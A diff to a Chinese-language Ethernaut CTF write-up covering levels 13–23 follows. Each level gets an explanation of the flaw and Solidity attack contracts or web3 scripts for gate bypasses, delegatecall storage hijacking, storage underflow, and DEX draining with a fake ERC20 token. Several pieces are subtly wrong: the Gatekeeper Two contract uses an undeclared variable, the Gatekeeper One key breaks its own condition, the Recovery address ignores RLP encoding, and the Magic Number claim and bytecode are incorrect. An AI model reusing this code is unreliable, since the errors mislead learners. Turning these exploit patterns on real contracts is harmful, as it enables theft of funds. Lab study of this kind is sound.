@@ -401,27 +401,290 @@ await contract.unlock(key.slice(0, 34)); // 使用前 16 字节
   - 加上 0x 的前缀，总共是 34 个字符。
   - 因此，key.slice(0, 34) 提取的就是前 16 字节的十六进制表示。
 
-## 13. Gatekeeper One 🔒
+## 13. Gatekeeper One ✅ [Hard]
 
-## 14. Gatekeeper Two 🔒
+这个关卡主要考察对访问控制和位操作的理解：
+- msg.sender 与 tx.origin 的区别
+  - 在以太坊中：
+    - msg.sender
+      - 当前调用合约的直接调用者。
+      - 在合约 A 调用合约 B 时，对于合约 B 来说，msg.sender 是合约 A 的地址。
+    - tx.origin
+      - 整个交易的起始调用者（通常是外部账户）。
+      - 无论有多少层合约调用，tx.origin 始终是最初发起交易的外部账户地址。
 
-## 15. Naught Coin 🔒
+攻击思路：
+1. 让msg.sender不等于tx.origin，即：引入一个中间合约来攻击即可，这样msg.sender就是中间合约的地址，tx.origin就是外部账户的地址
+2. 设计gateKey
+GateKey 的设计原理，_gateKey 是一个 bytes8 类型的参数，目标是满足以下三个条件：
 
-## 16. Preservation 🔒
+条件 1: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
+将 _gateKey 转换为 64 位无符号整数后，取前 32 位和前 16 位，它们的值必须相同。
+解释：
+_gateKey 的高位 48 位必须为 0，这样前 32 位和前 16 位会完全相同。
+例如：_gateKey = 0x000000000000ABCD。
+条件 2: uint32(uint64(_gateKey)) != uint64(_gateKey)
+将 _gateKey 转换为 64 位无符号整数后，前 32 位和完整 64 位的值不能相同。
+解释：
+_gateKey 的低位 32 位不能全是 0，否则前 32 位和完整 64 位会相同。
+例如：_gateKey = 0x00000000XXXXXXXX，其中 XXXXXXXX 不为 0。
+条件 3: uint32(uint64(_gateKey)) == uint16(tx.origin)
+_gateKey 的前 16 位必须等于你的外部账户地址的最后 2 字节。
+解释：
+tx.origin 是你的外部账户地址。
+地址是 20 字节（160 位），最后 2 字节就是地址的低位 16 位。
+```js
+const txOrigin = web3.eth.defaultAccount; // 你的外部账户地址
+const keyPart = txOrigin.slice(-4); // 获取地址最后 4 个字符（2 字节）
+const gateKey = `0x000000000000${keyPart}`; // 构造 _gateKey
+```
+3. 设计攻击合约
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
 
-## 17. Recovery 🔒
+contract GatekeeperOneAttack {
+    address public target;
 
-## 18. Magic Number 🔒
+    constructor(address _target) public {
+        target = _target;
+    }
 
-## 19. Alien Codex 🔒
+    function attack(bytes8 _gateKey) public {
+        for (uint256 i = 0; i < 8191; i++) {
+            (bool success, ) = target.call{gas: i + 8191 * 3}(
+                abi.encodeWithSignature("enter(bytes8)", _gateKey)
+            );
+            if (success) {
+                break;
+            }
+        }
+    }
+}
+```
 
-## 20. Denial 🔒
+学习要点：
+- 理解 GateKey 的设计原理
+- 使用 for 循环来反复攻击到gasleft() % 8191 == 0， call 函数进行重入攻击
+- 了解 msg.sender 和 tx.origin 的区别
 
-## 21. Shop 🔒
+## 14. Gatekeeper Two ✅ [Hard]
 
-## 22. Dex 🔒
+这关主要考察对访问控制、位操作和内联汇编的理解：
+- 内联汇编：内联汇编是 Solidity 中的一种低级语言，用于直接在 Solidity 代码中编写汇编代码。
 
-## 23. Dex Two 🔒
+攻击思路：
+1. Gate Two中使用内联汇编 extcodesize 检查调用者地址的代码大小：
+extcodesize(caller()) 获取调用者（msg.sender）地址的代码大小。
+如果调用者是合约地址，extcodesize 会返回合约代码的大小。
+要求 extcodesize 返回 0，说明调用者不能是一个已经部署好的合约。
+也即：需要在构造函数中调用目标合约来攻击，合约的构造函数执行期间，extcodesize 返回 0，因为合约的代码还没有部署。
+
+2. Gate Three就很简单，uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1。
+
+3.设计攻击合约
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface GatekeeperTwo {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract GatekeeperTwoAttack {
+    constructor(address target) public {
+        // 计算 _gateKey
+        unchecked {
+            gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
+        }
+
+        // 调用 enter 函数
+        GatekeeperTwo(target).enter(gateKey);
+    }
+}
+```
+
+学习要点：
+- 避免使用 extcodesize 判断调用者
+extcodesize 的行为在合约构造期间容易被绕过。
+- 改用更可靠的身份验证方式，比如签名验证。
+- 限制调用者范围
+验证调用者是否是预定义地址或经过授权的地址。
+- 避免使用易预测的哈希值
+不要依赖调用者地址或可预测的值作为访问条件。
+
+## 15. Naught Coin ✅ [Medium]
+
+没有新东西
+提供两个思路：
+第一种：使用ERC20的approve和transferfrom方法
+第二种：利用modifier设计的缺陷，通过中间合约来调用逃过require的时间检测
+
+## 16. Preservation ✅ [Medium]
+
+这关主要考察对delegatecall的理解：
+- delegatecall 是一种低级函数，用于在当前合约的上下文中执行另一个合约的代码。
+- 攻击者可以利用 delegatecall 来执行目标合约的代码，从而获取目标合约的控制权。
+
+攻击思路：
+1. LibraryContract 的 storedTime 虽然在其定义中位于 Slot 0，但由于使用了 delegatecall，其逻辑实际上操作的是 Preservation 合约的 Slot 0，即 timeZone1Library。
+2. 如果将 timeZone1Library 设置为攻击合约地址，可以通过 delegatecall 执行恶意合约逻辑，并直接修改 Slot 2（owner）。
+3. 攻击合约：
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract MaliciousLibrary {
+    // 保持存储布局与 Preservation 合约一致
+    address public timeZone1Library; // Slot 0
+    address public timeZone2Library; // Slot 1
+    address public owner;            // Slot 2
+
+    function setTime(uint256 _time) public {
+        owner = address(uint160(_time)); // 将 uint256 转为地址并赋值给 owner
+    }
+}
+```
+
+学习要点：
+- 理解 delegatecall 的工作原理
+- 存储布局一致性在使用 delegatecall 时至关重要。
+- 避免外部调用未受信任的合约地址。
+
+## 17. Recovery ✅ [Medium]
+
+这关考察的是通过区块链上公开的数据恢复丢失的合约和资金：
+在 Ethereum 中，合约地址是通过以下公式计算的：address = keccak256(rlp.encode([sender, nonce]))[12:]
+sender 是创建合约的地址。nonce 是该地址的交易计数。
+
+思路：
+找回地址即可：
+```js
+const recoveryAddress = "RECOVERY_CONTRACT_ADDRESS"; // 替换为实际地址
+const nonce = 1; // Recovery 合约的 nonce，假设这是它的第一次部署
+const tokenAddress = web3.utils.toChecksumAddress(
+  "0x" + web3.utils.keccak256(web3.eth.abi.encodeParameters(
+    ["address", "uint256"],
+    [recoveryAddress, nonce]
+  )).slice(26)
+);
+
+console.log("Token Address:", tokenAddress);
+```
+
+## 18. Magic Number ✅ [Easy]
+
+这关考察的是极简合约的构造以及如何通过 EVM 字节码直接部署合约:
+这个关卡的核心目标是部署一个符合以下条件的合约：
+
+代码总长度不超过 10 字节。
+返回任意有效的结果（不一定是 42）。
+```assembly
+PUSH1 0xff   // 推送值 255
+PUSH1 0x00   // 返回数据的存储位置
+RETURN
+```
+
+## 19. Alien Codex ✅ [Medium]
+
+思路很简单：利用codex.length--使下标溢出然后ethereum会认为此时的codex分布在整个2^256-1的slot中（Ethereum 认为数组 codex 的元素范围扩展到整个存储的所有槽位 (0 ~ 2^256-1)）此时我们计算出slot0（Owner）的索引i，然后修改存储在slot的owner
+实现很复杂：
+```js
+// 计算目标索引
+const hash1 = web3.utils.keccak256(web3.eth.abi.encodeParameter("uint256", 1));
+const targetIndex = web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(hash1));
+// 修改 slot 0
+const attackerBytes32 = web3.utils.padLeft(attacker, 64); // 将攻击者地址转换为 bytes32
+alienCodex.methods.revise(targetIndex.toString(), attackerBytes32).send({ from: attacker });
+```
+
+## 20. Denial ✅ [Easy]
+
+很简单，还是使用call的漏洞，消耗大量gas就行，或者直接把钱全盗出来
+
+## 21. Shop ✅ [Easy]
+
+主要就是攻击者的逻辑：
+```solidity
+ function price() external view override returns (uint256) {
+        // 根据 isSold 状态返回不同的价格
+        return shop.isSold() ? 0 : 100;
+    }
+```
+
+可能实际有变化，主要思想是：
+- 避免调用外部合约的函数返回值来决定逻辑：
+外部调用是不可控的，可能被恶意操纵。
+- 使用 view 函数获取外部值后立即保存：
+将外部函数的返回值保存到一个变量中，避免多次调用：
+
+```solidity
+uint256 currentPrice = _buyer.price();
+if (currentPrice >= price && !isSold) {
+    isSold = true;
+    price = currentPrice;
+}
+```
+- 严格验证逻辑：
+使用内部逻辑或固定值来决定合约行为，而不是外部依赖。
+
+## 22. Dex ✅ [Hard]
+
+这个很有意思：
+合约中代币价格的计算公式：uint256 swapAmount = (amount * toTokenBalance) / fromTokenBalance;
+该公式是一个简单的比例计算，用于动态确定代币的兑换比例。理论上可以工作，但它完全依赖于当前的池子余额来计算价格。
+当余额变化幅度较大（比如恶意用户操纵价格时），公式的输出就会大幅波动，导致价格失真。（容易出现1个Token1能换10个Token2的情况）那我来回倒腾就越赚越多。
+
+缺乏保护机制：
+没有滑点限制：滑点是代币价格波动的一个自然现象，但应该有一个限制，以避免因一次交易导致极端的价格变化。
+缺乏最小价格检查：合约允许攻击者利用逐步减少余额的方式，导致一种代币价格变得极低甚至为零，从而耗尽流动性池。
+
+这个漏洞暴露的问题是去中心化交易所需要更复杂的机制来保护池子的稳定性。解决方法是：  
+- 使用 恒定乘积公式 确保价格平稳。
+- 添加滑点保护和最小流动性限制。
+- 避免直接依赖外部用户行为决定合约逻辑。
+- 考虑手续费模型减少恶意行为的收益。
+
+
+## 23. Dex Two ✅ [Hard]
+
+这个对比dex1就是少了require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");限制
+那就可以注入一个攻击Token只要是实现了ERC20就行，那就可以添加攻击transfer了
+```solidity
+contract MaliciousToken is ERC20 {
+    constructor() ERC20("Malicious", "MTK") {}
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return 1e18; // 固定返回高余额
+    }
+
+    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
+        return true; // 强制转账成功
+    }
+}
+
+// 攻击合约
+contract AttackDexTwo {
+    DexTwo public dex;
+    MaliciousToken public token;
+
+    constructor(address _dex) {
+        dex = DexTwo(_dex);
+        token = new MaliciousToken();
+    }
+
+    function exploit() public {
+        // 向 DexTwo 中添加恶意代币流动性
+        dex.add_liquidity(address(token), 1); // 添加1个恶意代币
+
+        // 利用恶意代币的高余额操控价格
+        dex.swap(address(token), dex.token1(), 1);
+        dex.swap(address(token), dex.token2(), 1);
+
+        // 此时，DexTwo 的 token1 和 token2 已被耗尽
+    }
+}
+```
 
 ## 24. Puzzle Wallet 🔒
 
